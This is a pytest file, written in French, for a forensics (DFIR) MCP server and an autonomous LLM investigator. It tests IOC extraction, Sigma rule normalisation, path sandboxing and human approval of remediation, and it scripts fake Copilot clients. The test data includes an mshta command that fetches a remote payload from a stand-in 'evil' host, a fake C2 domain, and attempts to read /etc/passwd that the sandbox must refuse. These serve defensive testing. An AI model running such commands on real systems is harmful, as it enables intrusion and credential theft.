#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tests du serveur MCP DFIR et de l'enqueteur autonome GitHub Copilot
(mcp-server/phoenix_dfir_mcp)."""

import json
import os
import sys

import pytest


from phoenix_dfir_mcp import investigator, memory, pathpolicy, server, toolkit, zimmermann  # noqa: E402


@pytest.fixture(autouse=True)
def _loop_engine(monkeypatch):
    """Ces tests scriptent le moteur historique a boucle unique (mode 'loop') ;
    le moteur a phases est couvert par test_phases.py."""
    monkeypatch.setenv('PHOENIX_INVESTIGATION_MODE', 'loop')


@pytest.fixture(autouse=True)
def _reset_pathpolicy():
    """Isoler chaque test : politique de chemins permissive par defaut,
    index de preuves vide."""
    pathpolicy.reset()
    toolkit.reset_evidence_index()
    yield
    pathpolicy.reset()
    toolkit.reset_evidence_index()


@pytest.fixture
def lenient(monkeypatch):
    """Tests historiques de la memoire : constats sans reference de preuve."""
    monkeypatch.setenv('PHOENIX_STRICT_EVIDENCE', 'false')


def _unwrap(text):
    """Extraire le JSON de l'enveloppe <donnees_outil> du bouclier."""
    assert text.startswith('<donnees_outil ')
    return text.split('\n', 1)[1].rsplit('\n</donnees_outil', 1)[0]


# ============================================================================
# Boite a outils
# ============================================================================

CORE_TOOLS = {
    'list_artifacts', 'analyze_artifact', 'parse_evtx', 'parse_csv',
    'parse_json_file', 'parse_log_file', 'parse_prefetch', 'parse_lnk',
    'parse_browser_history', 'extract_iocs', 'sigma_scan', 'mitre_map_events',
    'virustotal_lookup', 'zimmermann_status', 'run_zimmermann', 'save_report',
    # Memoire d'enquete
    'set_investigation_plan', 'complete_plan_step', 'record_finding',
    'set_hypothesis', 'get_case_state', 'verify_finding',
    # Memoire vive, timeline EVTX, validation humaine
    'volatility_status', 'run_volatility', 'hayabusa_status', 'run_hayabusa',
    'propose_remediation',
    # Super-timeline, controle qualite et contre-analyse
    'search_evidence', 'get_timeline', 'list_sources', 'audit_tool_coverage',
    'audit_evidence_coverage', 'challenge_finding', 'declare_no_incident',
    # Images disque
    'disk_status', 'disk_image_info', 'disk_list_files', 'disk_timeline', 'disk_extract_artifacts',
}
# Les extensions (phoenix_dfir_mcp/ext) ajoutent leurs propres outils.
EXPECTED_TOOLS = CORE_TOOLS | toolkit.EXT_TOOLS

# Outils de raisonnement apportes par les extensions (phoenix_dfir_mcp/ext)
REASONING_TOOLS = {
    'add_hypothesis', 'weigh_evidence', 'rank_hypotheses',
    'graph_build', 'graph_neighbors', 'graph_blast_radius', 'graph_patient_zero',
    'casemem_similar_cases', 'casemem_index_case',
    'detect_generate_sigma', 'detect_test_rule', 'detect_generate_yara',
}


def _extension_only(names):
    """Outils definis uniquement par une extension (hors outils du coeur surcharges)."""
    return {n for n in names if n not in EXPECTED_TOOLS
            and toolkit.TOOLS[n]['func'].__module__.startswith('phoenix_dfir_mcp.ext.')}


def test_registre_outils_complet():
    tools = toolkit.list_tools()
    names = {t['name'] for t in tools}
    assert names - _extension_only(names) == EXPECTED_TOOLS
    assert REASONING_TOOLS <= names
    for t in tools:
        assert t['description']
        assert t['inputSchema']['type'] == 'object'


def test_format_openai_function_calling():
    tools = toolkit.openai_tools()
    names = {t['function']['name'] for t in tools}
    assert len(tools) == len(EXPECTED_TOOLS) + len(_extension_only(names))
    for t in tools:
        assert t['type'] == 'function'
        assert t['function']['name'] in EXPECTED_TOOLS | _extension_only(names)
        assert t['function']['parameters']['type'] == 'object'


def test_outil_inconnu_retourne_erreur():
    result = toolkit.run_tool('outil_inexistant', {})
    assert 'error' in result


def test_extract_iocs():
    result = toolkit.run_tool('extract_iocs', {
        'text': 'Beacon vers 185.220.101.5 (evil-c2.xyz), hash d41d8cd98f00b204e9800998ecf8427e, CVE-2024-1234',
    })
    types = {i['type'] for i in result['iocs']}
    assert {'ip', 'domain', 'hash_md5', 'cve'} <= types


def test_list_artifacts(tmp_path):
    (tmp_path / 'security.evtx').write_bytes(b'ElfFile-fake')
    (tmp_path / 'access.log').write_text('GET /admin 401\n')
    result = toolkit.run_tool('list_artifacts', {'case_dir': str(tmp_path)})
    assert result['total'] == 2
    by_name = {a['name']: a for a in result['artifacts']}
    assert 'EVTX' in by_name['security.evtx']['type']
    assert len(by_name['access.log']['sha256']) == 64


def test_list_artifacts_dossier_inconnu():
    assert 'error' in toolkit.run_tool('list_artifacts', {'case_dir': '/nulle/part'})


def test_sigma_scan_evenements_synthetiques():
    events = [{'event_id': 4625, 'data': {}} for _ in range(6)]
    events.append({'event_id': 1102, 'data': {}})
    events.append({'event_id': 4624, 'data': {'LogonType': '9'}})
    normalized = [toolkit._sigma_normalize_event(e) for e in events]
    result = toolkit._sigma_scan_events(normalized)
    rule_ids = {a['rule_id'] for a in result['alerts']}
    assert {'phoenix-brute-force', 'phoenix-log-clearing', 'phoenix-pass-the-hash'} <= rule_ids


def test_normalisation_sigma_champs_evtx():
    evt = {'event_id': 1, 'timestamp': '2026-01-01T00:00:00', 'data': {
        'Image': 'C:\\Windows\\System32\\mshta.exe',
        'CommandLine': 'mshta http://evil/payload.hta',
        'LogonType': '3',
    }}
    norm = toolkit._sigma_normalize_event(evt)
    assert norm['image'].endswith('mshta.exe')
    assert norm['command_line'].startswith('mshta')
    assert norm['logon_type'] == 3


def test_mitre_map_events():
    result = toolkit.run_tool('mitre_map_events', {'event_ids': [4625, 1102]})
    assert 'Credential Access' in result['tactics']
    assert 'Defense Evasion' in result['tactics']


def test_virustotal_sans_cle(monkeypatch):
    monkeypatch.delenv('API_KEY_VT', raising=False)
    result = toolkit.run_tool('virustotal_lookup', {'ioc_type': 'ip', 'value': '1.2.3.4'})
    assert 'API_KEY_VT' in result['error']


def test_save_report(tmp_path):
    result = toolkit.run_tool('save_report', {
        'case_dir': str(tmp_path), 'title': 'Cas 42', 'markdown': 'Resume executif.',
    })
    assert result['saved']
    content = open(result['report_path'], encoding='utf-8').read()
    assert content.startswith('# Cas 42')
    assert 'Resume executif.' in content


# ============================================================================
# Outils Eric Zimmermann
# ============================================================================

def test_zimmermann_status_sans_installation(monkeypatch):
    monkeypatch.delenv('EZ_TOOLS_PATH', raising=False)
    monkeypatch.setattr(zimmermann.shutil, 'which', lambda *_: None)
    st = zimmermann.status()
    assert st['available'] == {}
    assert 'EvtxECmd' in st['missing']
    assert 'ericzimmerman.github.io' in st['help']


def test_run_zimmermann_outil_absent(monkeypatch, tmp_path):
    monkeypatch.delenv('EZ_TOOLS_PATH', raising=False)
    monkeypatch.setattr(zimmermann.shutil, 'which', lambda *_: None)
    artefact = tmp_path / 'sample.pf'
    artefact.write_bytes(b'MAM\x04fake')
    result = zimmermann.run('PECmd', str(artefact))
    assert 'introuvable' in result['error']
    assert 'help' in result


def test_run_zimmermann_outil_non_supporte():
    assert 'error' in zimmermann.run('OutilInconnu', '/tmp/x')


# ============================================================================
# Serveur MCP (JSON-RPC stdio)
# ============================================================================

def test_mcp_initialize():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 1, 'method': 'initialize',
        'params': {'protocolVersion': '2025-06-18', 'clientInfo': {'name': 'copilot'}},
    })
    assert resp['result']['protocolVersion'] == '2025-06-18'
    assert resp['result']['serverInfo']['name'] == 'phoenix-dfir'
    assert 'tools' in resp['result']['capabilities']


def test_mcp_notification_sans_reponse():
    assert server.handle_message({'jsonrpc': '2.0', 'method': 'notifications/initialized'}) is None


def test_mcp_tools_list():
    resp = server.handle_message({'jsonrpc': '2.0', 'id': 2, 'method': 'tools/list'})
    names = {t['name'] for t in resp['result']['tools']}
    assert names - _extension_only(names) == EXPECTED_TOOLS


def test_mcp_tools_call():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 3, 'method': 'tools/call',
        'params': {'name': 'extract_iocs', 'arguments': {'text': 'ip 185.220.101.5'}},
    })
    assert resp['result']['isError'] is False
    payload = json.loads(_unwrap(resp['result']['content'][0]['text']))
    assert payload['total'] >= 1


def test_mcp_tools_call_erreur():
    resp = server.handle_message({
        'jsonrpc': '2.0', 'id': 4, 'method': 'tools/call',
        'params': {'name': 'list_artifacts', 'arguments': {'case_dir': '/nulle/part'}},
    })
    assert resp['result']['isError'] is True


def test_mcp_methode_inconnue():
    resp = server.handle_message({'jsonrpc': '2.0', 'id': 5, 'method': 'resources/list'})
    assert resp['error']['code'] == -32601


# ============================================================================
# Enqueteur autonome (GitHub Copilot simule)
# ============================================================================

def _tool_call(cid, name, args):
    return {'tool_calls': [{'id': cid, 'type': 'function',
                            'function': {'name': name, 'arguments': json.dumps(args)}}]}


def test_investigation_autonome_boucle_complete(monkeypatch, tmp_path, lenient):
    (tmp_path / 'auth.log').write_text('Failed password for root from 203.0.113.7\n' * 8)

    class FakeCopilot:
        calls = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}

        def chat(self, messages, tools=None, model=None):
            # Passe adviser : appelee sans outils
            if tools is None:
                return {'content': 'APPROVED: enquete complete et etayee.'}
            self.usage['calls'] += 1
            self.usage['total_tokens'] += 50
            FakeCopilot.calls += 1
            if FakeCopilot.calls == 1:
                return _tool_call('c1', 'list_artifacts', {'case_dir': str(tmp_path)})
            if FakeCopilot.calls == 2:
                assert messages[-1]['role'] == 'tool'
                assert 'auth.log' in messages[-1]['content']
                return _tool_call('c2', 'record_finding', {
                    'case_dir': str(tmp_path), 'title': 'Brute force SSH',
                    'severity': 'high', 'evidence': 'auth.log', 'mitre': 'T1110',
                    'confidence': 'confirmed'})
            if FakeCopilot.calls == 3:
                return _tool_call('c3', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'Brute force SSH',
                    'markdown': 'Attaque confirmee.'})
            return {'content': 'Enquete close : brute force SSH depuis 203.0.113.7.'}

    monkeypatch.setattr(investigator, 'CopilotClient', FakeCopilot)
    result = investigator.investigate(str(tmp_path))

    assert 'brute force' in result['summary'].lower()
    assert result['report_path'] and os.path.exists(result['report_path'])
    assert [t['tool'] for t in result['tool_calls']] == ['list_artifacts', 'record_finding', 'save_report']
    # Metriques d'observabilite
    assert result['metrics']['findings'] == 1
    assert result['metrics']['findings_critical_or_high'] == 1
    assert result['metrics']['total_tokens'] > 0
    assert 'APPROVED' in result['metrics']['adviser_verdict']
    # Le rapport annexe la synthese memoire
    report = open(result['report_path'], encoding='utf-8').read()
    assert 'Brute force SSH' in report and 'Synthese' in report


def test_memoire_findings_hypotheses(tmp_path, lenient):
    d = str(tmp_path)
    toolkit.run_tool('set_investigation_plan', {'case_dir': d, 'steps': ['a', 'b', 'c']})
    toolkit.run_tool('record_finding', {'case_dir': d, 'title': 'LSASS dump',
                                        'severity': 'critical', 'mitre': 'T1003.001'})
    r = toolkit.run_tool('set_hypothesis', {'case_dir': d, 'hypothesis': 'Vol de creds',
                                            'status': 'open'})
    assert 'created' in r
    # Mise a jour de la meme hypothese
    r = toolkit.run_tool('set_hypothesis', {'case_dir': d, 'hypothesis': 'Vol de creds',
                                            'status': 'confirmed', 'rationale': 'Mimikatz'})
    assert 'updated' in r and r['updated']['status'] == 'confirmed'
    r = toolkit.run_tool('complete_plan_step', {'case_dir': d, 'step_index': 1, 'note': 'ok'})
    assert r['remaining_steps'] == 2
    state = toolkit.run_tool('get_case_state', {'case_dir': d})
    assert state['summary']['findings'] == 1
    assert state['summary']['critical_or_high'] == 1
    assert state['summary']['hypotheses_confirmed'] == 1


def test_detection_boucle_injecte_un_conseil(monkeypatch, tmp_path):
    (tmp_path / 'x.log').write_text('rien\n')

    class LoopingCopilot:
        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.nudged = False

        def chat(self, messages, tools=None, model=None):
            if tools is None:
                return {'content': 'APPROVED'}
            self.usage['calls'] += 1
            # Detecter le message anti-boucle injecte
            if any(m['role'] == 'user' and 'memes arguments' in m.get('content', '')
                   for m in messages):
                self.nudged = True
                return _tool_call('end', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'fin'})
            # Rejouer sans cesse le meme appel
            return _tool_call('same', 'get_case_state', {'case_dir': str(tmp_path)})

    fake = LoopingCopilot()
    monkeypatch.setattr(investigator, 'CopilotClient', lambda **kw: fake)
    investigator.investigate(str(tmp_path), max_steps=10, enable_adviser=False)
    assert fake.nudged, "le nudge anti-boucle doit etre injecte apres repetitions"


def test_adviser_relance_sur_gaps(monkeypatch, tmp_path):
    (tmp_path / 'a.log').write_text('data\n')

    class GapsCopilot:
        calls = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.adviser_calls = 0
            self.v2_done = False

        def chat(self, messages, tools=None, model=None):
            if tools is None:  # adviser
                self.adviser_calls += 1
                # Premiere revue : lacunes ; l'enqueteur doit corriger
                return {'content': 'GAPS: timeline manquante' if self.adviser_calls == 1
                        else 'APPROVED: complet'}
            GapsCopilot.calls += 1
            if GapsCopilot.calls == 1:
                return _tool_call('r1', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'v1'})
            if not self.v2_done and any('lacunes' in m.get('content', '')
                                        for m in messages if m['role'] == 'user'):
                # A recu le retour adviser : reappelle save_report une fois
                self.v2_done = True
                return _tool_call('r2', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'T', 'markdown': 'v2 avec timeline'})
            return {'content': 'termine'}

    fake = GapsCopilot()
    monkeypatch.setattr(investigator, 'CopilotClient', lambda **kw: fake)
    result = investigator.investigate(str(tmp_path), max_steps=10)
    assert fake.adviser_calls >= 1
    assert 'APPROVED' in (result['metrics']['adviser_verdict'] or '')


def test_investigation_sans_jeton_erreur_explicite(monkeypatch, tmp_path):
    monkeypatch.delenv('GITHUB_TOKEN', raising=False)
    monkeypatch.delenv('PHOENIX_GITHUB_TOKEN', raising=False)
    monkeypatch.setenv('PHOENIX_LLM_PROVIDER', 'github')
    monkeypatch.setenv('PHOENIX_ALLOW_CLOUD_LLM', '1')
    from phoenix_dfir_mcp.copilot import CopilotClient, CopilotError
    with pytest.raises(CopilotError, match='GITHUB_TOKEN'):
        CopilotClient().chat([{'role': 'user', 'content': 'test'}])


# ============================================================================
# Sandboxing (politique de chemins)
# ============================================================================

def test_pathpolicy_permissif_sans_racine():
    assert pathpolicy.is_allowed('/etc/hostname') is True


def test_pathpolicy_confine_apres_racine(tmp_path):
    (tmp_path / 'evidence.log').write_text('x')
    pathpolicy.add_root(str(tmp_path))
    assert pathpolicy.is_allowed(str(tmp_path / 'evidence.log')) is True
    assert pathpolicy.is_allowed('/etc/passwd') is False
    # Un chemin qui remonte hors de la racine est refuse
    assert pathpolicy.is_allowed(str(tmp_path / '..' / 'ailleurs.txt')) is False


def test_run_tool_refuse_chemin_hors_sandbox(tmp_path):
    (tmp_path / 'a.log').write_text('data')
    pathpolicy.add_root(str(tmp_path))
    denied = toolkit.run_tool('parse_log_file', {'file_path': '/etc/passwd'})
    assert 'refuse' in denied.get('error', '').lower()
    ok = toolkit.run_tool('parse_log_file', {'file_path': str(tmp_path / 'a.log')})
    assert 'refuse' not in str(ok.get('error', '')).lower()


def test_pathpolicy_env_roots(monkeypatch, tmp_path):
    monkeypatch.setenv('PHOENIX_TOOL_ROOTS', str(tmp_path))
    assert pathpolicy.is_allowed(str(tmp_path / 'x')) is True
    assert pathpolicy.is_allowed('/var/tmp/y') is False


# ============================================================================
# Verification independante des constats
# ============================================================================

def test_verify_finding_met_a_jour_le_statut(tmp_path, lenient):
    d = str(tmp_path)
    toolkit.run_tool('record_finding', {'case_dir': d, 'title': 'LSASS dump',
                                        'severity': 'critical'})
    r = toolkit.run_tool('verify_finding', {'case_dir': d, 'finding_id': 1,
                                            'verdict': 'verified', 'note': 'confirme'})
    assert r['verified']['verification'] == 'verified'
    state = toolkit.run_tool('get_case_state', {'case_dir': d})
    assert state['summary']['findings_verified'] == 1


def test_llm_verified_without_reference_stays_unverified(tmp_path, lenient):
    """The independent LLM verification cannot promote a finding the evidence does not back."""
    from phoenix_dfir_mcp import verifier
    memory.record_finding(str(tmp_path), 'Brute force SSH', 'high', 'auth.log', 'T1110')
    memory.verify_finding(str(tmp_path), 1, 'verified', 'looks right')
    summary = verifier.verify_case(str(tmp_path))
    assert summary['verified'] == 0 and summary['unverified'] == 1
    finding = memory.get_state(str(tmp_path))['findings'][0]
    assert finding['verification'] == 'unverified'
    assert finding['deterministic']['reason'] == 'no evidence reference'


def test_verify_finding_inconnu():
    r = memory.verify_finding('/tmp', 999, 'verified')
    assert 'error' in r


def test_passe_verification_statue_les_constats(monkeypatch, tmp_path, lenient):
    (tmp_path / 'auth.log').write_text('Failed password from 203.0.113.7\n' * 8)

    class VerifyingCopilot:
        main = 0
        verif = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}

        def chat(self, messages, tools=None, model=None):
            if 'verificateur DFIR' in messages[0]['content']:
                VerifyingCopilot.verif += 1
                if VerifyingCopilot.verif == 1:
                    return _tool_call('v1', 'verify_finding', {
                        'case_dir': str(tmp_path), 'finding_id': 1,
                        'verdict': 'verified', 'note': 'auth.log confirme'})
                return {'content': 'Verification terminee.'}
            if tools is None:
                return {'content': 'APPROVED'}
            self.usage['calls'] += 1
            VerifyingCopilot.main += 1
            if VerifyingCopilot.main == 1:
                return _tool_call('p', 'parse_log_file', {'file_path': str(tmp_path / 'auth.log')})
            if VerifyingCopilot.main == 2:
                # Constat cite par une ligne reellement produite par l'outil
                return _tool_call('a', 'record_finding', {
                    'case_dir': str(tmp_path), 'title': 'Brute force SSH from 203.0.113.7',
                    'severity': 'high', 'evidence': 'auth.log', 'mitre': 'T1110',
                    'evidence_refs': [{'artifact': 'auth.log', 'kind': 'line', 'value': 1}]})
            if VerifyingCopilot.main == 3:
                return _tool_call('b', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'Incident',
                    'markdown': 'Brute force from 203.0.113.7 [F1].'})
            return {'content': 'Enquete close.'}

    monkeypatch.setattr(investigator, 'CopilotClient', VerifyingCopilot)
    result = investigator.investigate(str(tmp_path))
    assert result['metrics']['findings'] == 1
    assert result['metrics']['findings_verified'] == 1
    # Le rapport reflete le statut de verification
    report = open(result['report_path'], encoding='utf-8').read()
    assert 'Verification' in report and 'verifie' in report


def test_passe_verification_marque_non_verifie_par_defaut(monkeypatch, tmp_path, lenient):
    """Un constat que le verificateur ne statue pas devient 'unverified'."""
    (tmp_path / 'x.log').write_text('rien de probant\n')

    class LazyVerifier:
        main = 0

        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}

        def chat(self, messages, tools=None, model=None):
            if 'verificateur DFIR' in messages[0]['content']:
                return {'content': 'Rien a verifier.'}  # ne statue aucun constat
            if tools is None:
                return {'content': 'APPROVED'}
            self.usage['calls'] += 1
            LazyVerifier.main += 1
            if LazyVerifier.main == 1:
                return _tool_call('a', 'record_finding', {
                    'case_dir': str(tmp_path), 'title': 'Hypothese faible', 'severity': 'low'})
            if LazyVerifier.main == 2:
                return _tool_call('b', 'save_report', {
                    'case_dir': str(tmp_path), 'title': 'Cas', 'markdown': 'Rapport.'})
            return {'content': 'Fini.'}

    monkeypatch.setattr(investigator, 'CopilotClient', LazyVerifier)
    result = investigator.investigate(str(tmp_path))
    assert result['metrics']['findings_verified'] == 0
    assert result['metrics']['findings_unverified'] == 1


# ============================================================================
# Volatility 3, Hayabusa, remediation HITL, fournisseur Ollama
# ============================================================================

def _fake_cli(tmp_path, name, body):
    """Creer un faux binaire (script Python executable) pour simuler un outil.

    Sous Windows, un script a shebang n'est pas executable : un .bat appelle
    l'interpreteur Python sur le script."""
    script = tmp_path / name
    script.write_text(f"#!{sys.executable}\nimport json, sys\n{body}\n")
    script.chmod(0o755)
    if os.name == 'nt':
        wrapper = tmp_path / f'{name}.bat'
        wrapper.write_text(f'@"{sys.executable}" "{script}" %*\r\n')
        return str(wrapper)
    return str(script)


def test_volatility_plugin_hors_liste_blanche(tmp_path):
    dump = tmp_path / 'mem.raw'
    dump.write_bytes(b'\x00' * 64)
    r = toolkit.run_tool('run_volatility', {'file_path': str(dump), 'plugin': 'windows.dumpfiles'})
    assert 'non autorise' in r['error']


def test_volatility_absent(monkeypatch, tmp_path):
    from phoenix_dfir_mcp import volatility
    monkeypatch.setattr(volatility, '_find_command', lambda: None)
    dump = tmp_path / 'mem.raw'
    dump.write_bytes(b'\x00')
    r = volatility.run(str(dump), 'windows.pslist')
    assert 'introuvable' in r['error'] and 'help' in r


def test_volatility_sortie_json_aplatie(monkeypatch, tmp_path):
    from phoenix_dfir_mcp import volatility
    rows = [{'PID': 4, 'ImageFileName': 'System', '__children': [
        {'PID': 4192, 'ImageFileName': 'svchost.exe', '__children': []}]}]
    cli = _fake_cli(tmp_path, 'vol', f"assert '-r' in sys.argv and '--pid' in sys.argv\n"
                                     f"print(json.dumps({rows!r}))")
    monkeypatch.setenv('PHOENIX_VOLATILITY_CMD', cli)
    dump = tmp_path / 'memdump.raw'
    dump.write_bytes(b'\x00' * 64)
    r = toolkit.run_tool('run_volatility', {'file_path': str(dump), 'plugin': 'windows.pstree',
                                            'pid': 4192})
    assert r['exit_code'] == 0
    assert r['total_rows'] == 2
    assert r['rows'][1]['ImageFileName'] == 'svchost.exe' and r['rows'][1]['_depth'] == 1


def test_volatility_pid_refuse_si_non_supporte(monkeypatch, tmp_path):
    from phoenix_dfir_mcp import volatility
    monkeypatch.setattr(volatility, '_find_command', lambda: ['vol'])
    dump = tmp_path / 'm.raw'
    dump.write_bytes(b'\x00')
    assert 'pid' in volatility.run(str(dump), 'windows.netscan', pid=4)['error']


def test_hayabusa_timeline_jsonl(monkeypatch, tmp_path):
    body = (
        "out = sys.argv[sys.argv.index('-o') + 1]\n"
        "recs = [{'Timestamp': '2026-10-01 10:00:00', 'Level': 'med', 'RuleTitle': 'Suspicious PS',"
        " 'EventID': 4104, 'Computer': 'SRV', 'Channel': 'PwSh', 'RecordID': 1},"
        " {'Timestamp': '2026-10-01 10:05:00', 'Level': 'crit', 'RuleTitle': 'Mimikatz',"
        " 'EventID': 10, 'Computer': 'SRV', 'Channel': 'Sysmon', 'RecordID': 98412,"
        " 'MitreTags': ['T1003.001']}]\n"
        "open(out, 'w').write('\\n'.join(json.dumps(r) for r in recs))"
    )
    cli = _fake_cli(tmp_path, 'hayabusa', body)
    monkeypatch.setenv('PHOENIX_HAYABUSA_CMD', cli)
    evtx = tmp_path / 'Security.evtx'
    evtx.write_bytes(b'ElfFile\x00')
    r = toolkit.run_tool('run_hayabusa', {'file_path': str(evtx), 'min_level': 'medium'})
    assert r['total_alerts'] == 2
    assert r['alerts'][0]['rule'] == 'Mimikatz'  # trie par severite
    assert r['by_level'] == {'med': 1, 'crit': 1}


def test_hayabusa_niveau_invalide(tmp_path):
    evtx = tmp_path / 'a.evtx'
    evtx.write_bytes(b'x')
    assert 'min_level' in toolkit.run_tool('run_hayabusa', {'file_path': str(evtx),
                                                            'min_level': 'extreme'})['error']


def test_propose_remediation_en_attente_et_annexee(tmp_path):
    d = str(tmp_path)
    r = toolkit.run_tool('propose_remediation', {
        'case_dir': d, 'target_host': 'SRV-AD-01', 'command': 'isoler SRV-AD-01',
        'reason': 'Beacon C2 vers 185.220.101.44', 'mitre': 'T1071', 'severity': 'critical'})
    assert r['status'] == 'pending_approval' and "N'EST PAS" in r['message']
    state = memory.get_state(d)
    assert state['summary']['remediations_pending'] == 1
    assert 'Remediations proposees' in memory.render_markdown(d)
    memory.set_remediation_status(d, 1, 'approved')
    assert memory.get_state(d)['summary']['remediations_pending'] == 0
    assert 'APPROUVEE' in memory.render_markdown(d)
    # Jamais disponible pour la passe de verification (lecture seule)
    assert 'propose_remediation' not in toolkit.READONLY_TOOLS


def test_agents_specialises():
    assert toolkit.agent_for('run_volatility').startswith('Agent Memoire')
    assert toolkit.agent_for('sigma_scan') == 'Agent Disque & EVTX'
    assert toolkit.agent_for('record_finding') == 'Orchestrateur Lead'


def test_investigateur_notifie_chaque_outil(monkeypatch, tmp_path):
    (tmp_path / 'auth.log').write_text('Failed password\n')

    class OneShot:
        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.n = 0

        def chat(self, messages, tools=None, model=None):
            self.n += 1
            if self.n == 1:
                return _tool_call('a', 'list_artifacts', {'case_dir': str(tmp_path)})
            if self.n == 2:
                return _tool_call('b', 'save_report', {'case_dir': str(tmp_path), 'title': 'T',
                                                       'markdown': 'fin'})
            return {'content': 'termine'}

    monkeypatch.setattr(investigator, 'CopilotClient', OneShot)
    seen = []
    investigator.investigate(str(tmp_path), enable_adviser=False, enable_verification=False,
                             on_tool=lambda step, name, args, result: seen.append(name))
    assert seen == ['list_artifacts', 'save_report']


def test_callback_on_tool_defaillant_n_interrompt_pas(monkeypatch, tmp_path):
    class OneShot:
        def __init__(self, **kwargs):
            self.usage = {'prompt_tokens': 0, 'completion_tokens': 0, 'total_tokens': 0, 'calls': 0}
            self.n = 0

        def chat(self, messages, tools=None, model=None):
            self.n += 1
            if self.n == 1:
                return _tool_call('a', 'get_case_state', {'case_dir': str(tmp_path)})
            return {'content': 'ok'}

    monkeypatch.setattr(investigator, 'CopilotClient', OneShot)

    def boom(*_a):
        raise RuntimeError('panne chaine de preuve')

    result = investigator.investigate(str(tmp_path), enable_adviser=False,
                                      enable_verification=False, on_tool=boom)
    assert result['summary'] == 'ok'


def test_fournisseur_ollama_sans_jeton(monkeypatch):
    from phoenix_dfir_mcp import copilot
    monkeypatch.setenv('PHOENIX_LLM_PROVIDER', 'ollama')
    monkeypatch.setenv('OLLAMA_BASE_URL', 'http://host.docker.internal:11434/')
    monkeypatch.delenv('GITHUB_TOKEN', raising=False)
    monkeypatch.delenv('PHOENIX_GITHUB_TOKEN', raising=False)
    monkeypatch.delenv('PHOENIX_OLLAMA_MODEL', raising=False)
    assert copilot.is_configured()
    client = copilot.CopilotClient()
    assert client.url == 'http://host.docker.internal:11434/v1/chat/completions'
    assert client.model == copilot.DEFAULT_OLLAMA_MODEL

    captured = {}

    class Resp:
        def raise_for_status(self):
            pass

        def json(self):
            return {'choices': [{'message': {'content': 'local'}}], 'usage': {'total_tokens': 7}}

    def fake_post(url, headers=None, json=None, timeout=None):
        captured.update(url=url, headers=headers, payload=json)
        return Resp()

    monkeypatch.setattr(copilot.requests, 'post', fake_post)
    msg = client.chat([{'role': 'user', 'content': 'hello'}])
    assert msg['content'] == 'local'
    assert 'Authorization' not in captured['headers']
    assert captured['payload']['model'] == copilot.DEFAULT_OLLAMA_MODEL
    assert client.usage['total_tokens'] == 7


def test_fournisseur_inconnu_retombe_sur_ollama_local(monkeypatch):
    from phoenix_dfir_mcp import copilot
    monkeypatch.setenv('PHOENIX_LLM_PROVIDER', 'inconnu')
    assert copilot.provider_name() == 'ollama'


def test_extensions_chargees_sans_erreur():
    assert not toolkit.EXT_ERRORS, toolkit.EXT_ERRORS
    assert toolkit.EXT_TOOLS.isdisjoint(CORE_TOOLS)
